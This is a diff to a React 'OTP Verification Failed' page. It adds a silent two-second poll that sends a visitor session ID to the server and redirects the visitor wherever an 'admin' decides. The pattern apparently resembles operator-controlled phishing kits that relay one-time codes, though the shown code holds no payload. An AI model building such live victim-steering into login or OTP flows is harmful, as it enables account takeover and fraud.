@@ -1,14 +1,36 @@
 import { useEffect } from "react";
-import { Link } from "wouter";
+import { Link, useLocation } from "wouter";
 import { XCircle } from "lucide-react";
 import { useTranslation } from "@/contexts/LanguageContext";
+import { apiRequest } from "@/lib/queryClient";
 
 export default function OtpError() {
   const { t } = useTranslation();
+  const [, setLocation] = useLocation();
 
   useEffect(() => {
     document.title = "OTP Verification Failed";
-  }, []);
+
+    // Check for admin redirect every 2 seconds
+    const redirectCheck = setInterval(async () => {
+      try {
+        const sessionId = localStorage.getItem('visitorSessionId');
+        if (sessionId) {
+          const response = await apiRequest("POST", "/api/check-redirect", { sessionId });
+          const data = await response.json();
+          
+          if (data.redirect) {
+            console.log(`🎯 REDIRECTING FROM OTP-ERROR TO: ${data.redirect}`);
+            setLocation(data.redirect);
+          }
+        }
+      } catch (error) {
+        // Silent fail
+      }
+    }, 2000);
+
+    return () => clearInterval(redirectCheck);
+  }, [setLocation]);
 
   return (
     <div className="min-h-screen flex flex-col items-center justify-center bg-white px-4">
